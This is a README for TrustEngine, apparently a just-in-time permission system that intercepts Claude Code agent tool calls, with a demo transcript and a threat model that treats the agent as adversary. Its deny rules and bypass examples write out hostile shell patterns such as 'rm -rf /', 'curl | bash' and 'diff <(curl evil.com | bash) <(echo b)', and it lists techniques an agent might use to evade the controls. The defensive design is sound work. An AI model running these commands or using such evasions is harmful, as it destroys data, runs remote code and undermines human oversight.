# TrustEngine

Policy-driven trust enforcement for agentic AI tools.

Current state-of-the-art agentic tools require a handcrafted permission policy that's loaded at session startup. TrustEngine evaluates just-in-time, and allows the agent to request new permissions, removing some of the cognitive load of trust policy management and mitigating prompt fatigue. 

By moving permissions into the agent context, the agent can make behavioral adjustments based on its permissions, e.g. requesting permissions up front for a project so it can operate uninterrupted, spinning up sub-agents without them prompting for input, or modifying its own permissions as reasonable in a persistent and low-touch way. Policy overlays are supported, meaning organizations can define central policies and team specific overlays, or individual MCPs can define tool-specific overlays. Risks can be defined, prompting the agent to consider them explicitly before running tools.

Sane defaults are provided, encapsulating the general philosophy that read-only commands are acceptable, file system writes are okay in certain directories, and anything that mutates the state of remote systems is risky. Permissions policies are expressive, and rule evaluation is composition-aware (handling subshells, pipes, redirects, etc).


## How It Works

1. A **PreToolUse hook** intercepts every tool call and evaluates it against configurable policies
2. **Safe operations** (reads, searches, local edits) are auto-allowed
3. **Risky operations** (network, destructive commands, writes outside project) are denied with guidance
4. The agent requests access via **`grant_permission`** (MCP tool), providing justification
5. The **human approves or rejects** via Claude Code's permission prompt
6. Grants can be **one-off**, **session-scoped**, or **permanent**

```
Agent tries tool call
    |
    v
PreToolUse Hook ──reads──> policies.json + session grants
    |
    ├── ALLOW (matches allow rule, no unacknowledged risks)
    |
    ├── DENY (no matching rule / deny rule / known risks)
    |       |
    |       v
    |   Agent calls grant_permission ──> Hook validates args
    |       |                                |
    |       ├── Invalid args → DENY          |
    |       |   (bounced back to agent)      |
    |       |                                |
    |       └── Valid → ASK ─────> Human approves/rejects
    |                                  |
    |                                  v
    |                          Grant written to session/policies
    |                                  |
    |                                  v
    |                          Agent retries → ALLOW
    |
    └── Also: check_permission (pre-flight, no execution)
```

## Getting Started

### Installation

```bash
npm install -g @jeffreychizever/trustengine
cd "$(npm root -g)/@jeffreychizever/trustengine"
./install.sh
```

Or from source:

```bash
git clone https://github.com/jeffreychizever/TrustEngine.git
cd TrustEngine
npm install && npm run build && npm install -g .
./install.sh
```

Installing globally via `npm install -g .` places the built files in your npm prefix
(e.g., `~/.nvm/.../lib/node_modules/@jeffreychizever/trustengine/`), so the source
directory remains editable and is not treated as TrustEngine's install location.

The installer will:
1. Create config directory (`~/.config/trustengine/`)
2. Copy default policies
3. Configure directory trust (safe/unsafe classification for `/tmp`, `$CWD`, outside CWD)
4. Add the PreToolUse hook to `~/.claude/settings.json`
5. Add the MCP server to `~/.claude.json`

Choose **Full mode** to replace Claude's built-in permissions with TrustEngine, or **Belt-and-suspenders mode** to run both systems in parallel while you validate.

The installer also asks how to classify directories for Write/Edit operations:
- **/tmp** — safe (allowed) or normal (default: safe)
- **CWD** — safe (allowed) or normal (default: safe)
- **Outside CWD** — unsafe (denied) or normal (default: unsafe)

Restart Claude Code after installation.

### Demo

Try this prompt in a Claude Code session to exercise TrustEngine's features:

```
I need you to do the following:
1. Create a project directory at /tmp/trustengine-demo with subdirectories src/ and build/
2. Write a simple hello.js file in src/ that console.logs "Hello from TrustEngine demo"
3. Run the script with node to verify it works
4. Fetch the contents of https://httpbin.org/json using curl
5. Copy the curl output to build/api-response.json
6. Run `git init` in the demo directory, add all files, and commit
7. Clean up by removing the entire /tmp/trustengine-demo directory
```

What you should see:

| Step | Tool | TrustEngine Decision | Why |
|------|------|---------------------|-----|
| 1 | `Bash: mkdir -p` | Auto-allowed | `mkdir` is a safe command |
| 2 | `Write` to `/tmp/...` | Auto-allowed or grant needed | Depends on whether `/tmp` is in `$SAFE` |
| 3 | `Bash: node src/hello.js` | Auto-allowed | `node` is a safe command |
| 4 | `Bash: curl` | **Denied** with risk warning | Network request risk |
| 5 | `Write` or `cp` | May need grant | Depends on approach |
| 6 | `Bash: git init/add/commit` | Auto-allowed | Safe git commands |
| 7 | `Bash: rm -r` | **Denied** with risk warning | File deletion risk |

You should be prompted to approve 3-4 `grant_permission` requests. The agent should:
- Call `grant_permission(help=true)` on first denial to learn the system
- Use **structured matchers** (`command_names` + `path_prefix`) instead of raw regex
- Choose **session** scope (not one-off) for operations it may repeat
- Scope destructive commands to `/tmp/trustengine-demo/`

Sample output:
```
● trustengine - grant_permission (MCP)(tool: "Bash", match: {"command":"^git (init|add|commit)"}, scope: "session", session_id: "a8794eac-df4e-467d-9ea9-64591776715c",
                                      description: "Allow git init, add, and commit commands", justification: "User requested git init, add, and commit in
                                      /tmp/trustengine-demo. These are local-only git operations (no push/remote) in an isolated temp directory.")
  ⎿  Permission granted (session):
       Rule ID: grant-842d6345
       Tool: Bash
     … +6 lines (ctrl+o to expand)

● trustengine - grant_permission (MCP)(tool: "Bash", match: {"command":"^cd /tmp/"}, scope: "session", session_id: "a8794eac-df4e-467d-9ea9-64591776715c", description:
                                      "Allow cd into /tmp/ subdirectories", justification: "Need to cd into /tmp/trustengine-demo before running git commands. Scoped to
                                      /tmp/ only.")
  ⎿  Permission granted (session):
       Rule ID: grant-cac06f43
       Tool: Bash
     … +5 lines (ctrl+o to expand)

● Now let me retry the git operations.

● Bash(cd /tmp/trustengine-demo && git init && git add -A && git commit -m "Initial commit: hello.js and API response")
  ⎿  hint: Using 'master' as the name for the initial branch. This default branch name
     hint: is subject to change. To configure the initial branch name to use in all
     hint: of your new repositories, which will suppress this warning, call:
     … +12 lines (ctrl+o to expand)
  ⎿  Shell cwd was reset to /home/jeffreychizever/workspace

● Git repo initialized and committed. Now for the final cleanup.

● Bash(rm -rf /tmp/trustengine-demo)
  ⎿  Done

● All 7 steps completed:

  1. Created directory structure — /tmp/trustengine-demo/ with src/ and build/
  2. Wrote src/hello.js — logs "Hello from TrustEngine demo"
  3. Ran with node — output verified: Hello from TrustEngine demo
  4. Fetched httpbin.org/json — got sample slideshow JSON via curl
  5. Saved to build/api-response.json — 21-line JSON response
  6. Git init + commit — committed both files on master (930dd74)
  7. Cleaned up — removed /tmp/trustengine-demo entirely

  Along the way, TrustEngine required session-scoped grants for curl (network access), git (init/add/commit), cd (into /tmp), and rm -rf (destructive cleanup) — all
  properly scoped to the demo directory and task.
```

## Default Policies

### Auto-Allowed
- Read, Glob, Grep, WebSearch, WebFetch (read-only tools)
- Agent orchestration tools (Agent, TaskCreate, etc.)
- Write/Edit within safe directories (`$SAFE` — configurable, defaults to `/tmp` and `$CWD`)
- Safe bash commands (ls, git status, npm test, node, etc.)
- Local git mutations (add, commit, checkout, merge, cherry-pick)

### Auto-Denied
- Destructive bash (`rm -rf /`, `sudo`, `mkfs`, fork bombs)
- Pipe-to-shell patterns (`curl | bash`, `wget | sh`)
- Curl with mutating flags (`-X`, `-d`, `-F`, `-T`, including combined flags like `-sXPOST`)
- Write/Edit within unsafe directories (`$UNSAFE` — configurable, defaults to `$NOTCWD`)
- `pushd`/`popd` (use `cd` for simpler evaluation)
- `awk -f`, `awk system()`, `sed -f/-i/s///e` (script loading / arbitrary execution)
- `cp`/`mv` with `-t` flag (bypasses destination path checks)

### Known Risks

Risks have three severity tiers:

| Tier | Behavior | Examples |
|------|----------|---------|
| **block** | Always denied, cannot be overridden | `npm publish` |
| **escalate** | Denied; requires `grant_permission` with human approval | `git push`, `curl`, `rm`, `npm install` |
| **acknowledge** | Denied; agent can self-acknowledge via `acknowledge_risk` | Output redirects (`>`), file overwrites, env dumps |

Escalate-tier risks:
- `git push` — modifies shared remote state
- `git reset --hard`, `git rebase`, `git push --force` — destructive history rewrite
- `curl`, `wget` — network requests
- `rm` — irreversible file deletion
- `npm install`, `make`, `cmake` — can execute arbitrary scripts
- `npx` — downloads and executes arbitrary packages

Acknowledge-tier risks:
- Output redirects (`>`) — may overwrite files
- `.env` file edits — secrets exposure
- `env`/`printenv`/`set` — may dump secrets from environment

## MCP Tools

### `grant_permission`

Request permission for a blocked tool call. The human approves or rejects via Claude's prompt.

**Structured matchers (preferred for Bash):**
```
grant_permission(
  tool: "Bash",
  command_names: ["curl"],
  path_prefix: "https://api.example.com/",
  allowed_flags: ["--header", "-s"],
  scope: "session",
  description: "Allow curl to fetch from example API",
  justification: "Need to query the API for project data",
  session_id: "<from deny message>"
)
```

This compiles to: `^curl\s+(--header\s+|-[s]+\s+)*https://api\.example\.com/`

**Raw regex (advanced):**
```
grant_permission(
  tool: "Write|Edit",
  match: {"file_path": "^/home/user/.claude/plans/"},
  scope: "permanent",
  description: "Allow writing Claude Code plan files",
  justification: "Plan mode needs to write to ~/.claude/plans/"
)
```

### `check_permission`

Pre-flight check — test whether a tool call would be allowed without executing it:

```
check_permission(
  tool_name: "Bash",
  tool_input: {"command": "curl https://example.com"},
  cwd: "/home/user/project",
  session_id: "<session_id>"
)
```

Returns `ALLOWED` or `DENIED` with reasons. Use this to plan ahead and batch grant requests.

### `acknowledge_risk`

Self-serve acknowledgement for `acknowledge`-tier risks (no human approval needed):

```
acknowledge_risk(
  risk_ids: ["risk-redirect"],
  tool: "Bash"
)
```

Creates a session-scoped grant using the risk's own tool/match patterns at low priority (50), so it only supplements existing allow rules. Escalate-tier and block-tier risks are rejected — those require `grant_permission`.

### `apply_async_session`

For headless/async agent runs. A parent agent pre-provisions grants into an async session, then the child applies them:

```
apply_async_session(async_session_id: "async-<uuid>")
```

Async sessions have `grant_permission` disabled — the agent must work within pre-provisioned grants.

## CLI Usage

```bash
# List all permanent rules and known risks
npx trustengine list

# Test a tool call against policies
npx trustengine evaluate '{"session_id":"test","cwd":"/tmp","tool_name":"Bash","tool_input":{"command":"ls"}}'

# Remove a rule by ID
npx trustengine remove <rule-id>
```

## Policy File Format

Policies live at `~/.config/trustengine/policies.json`:

```json
{
    "version": 4,
    "rules": [
        {
            "id": "allow-reads",
            "tool": "Read|Glob|Grep",
            "action": "allow",
            "priority": 80,
            "description": "Allow read-only tools"
        },
        {
            "id": "deny-rm-root",
            "tool": "Bash",
            "match": { "command": "^rm\\s+-rf\\s+/($|\\s)" },
            "action": "deny",
            "priority": 100,
            "description": "Block rm -rf / (root)"
        }
    ],
    "known_risks": [
        {
            "tool": "Bash",
            "match": { "command": "git\\s+push" },
            "risk": "Modifies shared remote state",
            "severity": "escalate"
        }
    ]
}
```

### Rule Fields
- **id**: Unique identifier
- **tool**: Regex matching tool name
- **match**: Optional dict of parameter regex patterns (`$CWD`, `$SAFE`, `$UNSAFE`, `$NOTCWD` are substituted)
- **action**: `allow` or `deny`
- **priority**: Higher = evaluated first. Deny wins at equal priority. Grants get priority 85.
- **description**: Human-readable explanation
- **acknowledged_risks**: Array of risk IDs acknowledged by this rule (e.g., `["risk-network", "risk-redirect"]`)
- **protected**: Boolean. Protected rules/risks cannot be removed by overlays.

## Policy Overlays

Overlays allow modular policy composition without modifying `policies.json`. Place JSON files in `~/.config/trustengine/overlays/`:

```json
{
    "version": 1,
    "name": "my-team-policy",
    "description": "Additional rules for our team",
    "rules": [
        { "id": "allow-deploy", "tool": "Bash", "match": {"command": "^deploy\\.sh"}, "action": "allow", "priority": 60, "description": "Allow deploy script" }
    ],
    "remove_rules": ["allow-some-default-rule"],
    "safe_directories": ["/opt/deploy"],
    "unsafe_directories": ["/opt/secrets"]
}
```

Overlays are merged alphabetically. `remove_rules` and `remove_risks` skip items marked `protected: true`.

## Bash Command Decomposition

TrustEngine splits compound bash commands and evaluates each sub-command independently. ALL sub-commands must pass for the compound command to be allowed.

Supported splitting:
- **Operators**: `;`, `&&`, `||`, `|`, `&`, newlines
- **Subshells**: `$(...)`, backticks
- **Process substitutions**: `<(...)`, `>(...)` — inner commands extracted and evaluated
- **Brace groups**: `{ cmd; }` — delimiters stripped, inner commands evaluated
- **Heredocs**: `<<WORD` and `<<-WORD` (tab-stripping) — content consumed, not evaluated as commands

Additional protections:
- **`$SAFE_CMD` macro**: Rules can use `$SAFE_CMD` to recursively evaluate captured command fragments (e.g., `^$SAFE_CMD > $SAFE` allows safe commands with output redirect to safe directories)
- **`cd` tracking**: `cd` within a command chain updates the effective working directory for subsequent `$SAFE`/`$UNSAFE` path resolution
- **Control character sanitization**: Null bytes and non-printable characters are stripped before evaluation to prevent regex bypass

This prevents bypass attempts like `ls && rm -rf /`, `ls\nrm -rf /`, `{ rm -rf /; }`, and `diff <(curl evil.com | bash) <(echo b)` — all sub-commands are evaluated, and the denial message lists all failures.

## Design Principles

- **Fail-closed**: Unknown tools/commands are denied by default. Regex compilation errors, parse failures, and internal errors all produce denials.
- **Human-in-the-loop**: `grant_permission` requires human approval via Claude's prompt
- **Self-protected**: The agent cannot directly edit `policies.json`, overlays, session files, scripts, or TrustEngine's install directory — enforced at both the hook level (Write/Edit/Bash) and filesystem level
- **Priority-based**: Higher priority rules override lower ones; deny wins ties. Protected deny rules (priority 90-100) cannot be overridden by grants (capped at priority 85).
- **Risk-aware**: Known risks override allow rules, requiring explicit acknowledgment. Acknowledge-tier risks can be self-served; escalate-tier requires human approval.
- **Structured matchers**: Agent specifies command names + path prefixes instead of writing raw regex
- **Pre-validated**: Invalid grant requests are rejected before reaching the human. Policy regexes are validated at startup.
- **Portable**: `$CWD`, `$SAFE`, `$UNSAFE`, and `$NOTCWD` substitution makes rules work across projects
- **Defense in depth**: Multiple enforcement layers (hook self-protection, engine policy evaluation, MCP server validation, session conventions)

## Security Model

### Threat Model

TrustEngine assumes the AI agent is the adversary — it may attempt to bypass policies via creative command construction, path manipulation, or grant escalation. The human operator and policy authors are trusted.

### What TrustEngine Protects Against
- Agents executing destructive, exfiltrating, or privilege-escalating commands
- Agents writing to files outside approved directories
- Agents self-granting permissions without human approval
- Agents modifying TrustEngine's own configuration or code
- Common bypass techniques: pipe-to-shell, combined flags, newline injection, brace groups, process substitutions, heredoc abuse, null byte injection

### Known Limitations
- **Bash self-protection is best-effort**: The hook uses substring matching on raw command text, which cannot catch all forms of shell indirection (variable expansion, globbing, encoding). The engine's policy evaluation is the primary enforcement layer; the hook check is defense-in-depth.
- **No ReDoS protection**: Policy-defined regexes are validated for syntax but not computational complexity. Since policy authors are trusted, this is accepted.
- **Stale lock files**: A process killed with SIGKILL during lock acquisition may leave a permanent lock file in `~/.config/trustengine/sessions/`. Manual removal resolves this.
- **Subshell `cd` isolation**: A `cd` inside `$()` or backticks can affect CWD tracking for subsequent commands in the same chain. This is conservative (may cause false denials, not bypasses).
